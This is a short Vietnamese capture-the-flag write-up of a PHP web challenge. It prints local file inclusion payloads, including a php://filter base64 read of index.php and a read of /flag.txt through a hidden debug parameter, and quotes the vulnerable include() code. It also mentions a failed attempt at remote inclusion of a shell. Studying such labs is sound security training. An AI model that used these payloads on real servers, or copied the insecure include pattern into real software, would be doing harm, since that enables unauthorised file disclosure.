

---
Tài liệu/Bài báo tham khảo:


---


![Pasted image 20261015112535](Attachments/Pasted%20image%2020261015112535.png)


Giao diện web chỉ có 2 nút: Red/Blue, ấn vào sẽ xuất hiện hình ảnh 2 màu thuốc khác nhau:

![340](Attachments/Pasted%20image%2020261015112644.png)![322](Attachments/Pasted%20image%2020261015112700.png)

![Pasted image 20261015112839](Attachments/Pasted%20image%2020261015112839.png)

Mình thử đổi param pill=random thì PHP báo lỗi:
![Pasted image 20261015112956](Attachments/Pasted%20image%2020261015112956.png)


Mình thử chèn một URL vào xem có RFI không để mình chèn shell:
![Pasted image 20261015114805](Attachments/Pasted%20image%2020261015114805.png)
Kết quả là không được😀


Sau đó, mình thử tiếp LFI thì dễ dàng đọc được mã nguồn trang index.php thông qua lỗi LFI:
Payload:
`?pill=php://filter/convert.base64-encode/resource=index`
![Pasted image 20261015113714](Attachments/Pasted%20image%2020261015113714.png)


![Pasted image 20261015113638](Attachments/Pasted%20image%2020261015113638.png)
```php
<?php
if (isset($_GET['pill']) && !empty($_GET['pill'])) {
    $pill = $_GET['pill'];
    // Just 4 debugging. No one will find out
    if (isset($_GET['R3mN8xP9wB2zL7cQ1vT5sF6gY4hJ0kU2iO8lM7nB5vC3x'])) {
        $ext = $_GET['R3mN8xP9wB2zL7cQ1vT5sF6gY4hJ0kU2iO8lM7nB5vC3x'];
        include($pill . $ext);
        exit;
    } else {
        include($pill . '.php');
        exit;
    }
}
?>
```


Kaka, sau đó mình thấy PHP nhận tham số 'R3mN8xP9wB2zL7cQ1vT5sF6gY4hJ0kU2iO8lM7nB5vC3x' và trả về đuôi file tùy chỉnh mình muốn xem, không dừng lại ở .php.

Thế là mình dễ dàng đọc được flag.txt mà không cần thử chèn shell hay gì cả:
Payload:
`?pill=/flag&R3mN8xP9wB2zL7cQ1vT5sF6gY4hJ0kU2iO8lM7nB5vC3x=.txt`

![Pasted image 20261015114306](Attachments/Pasted%20image%2020261015114306.png)
Mình không hiểu sao đây là bài Normal vì mình thấy nó dễ hơn nhiều một số bài Easy mình làm trong training 🥶

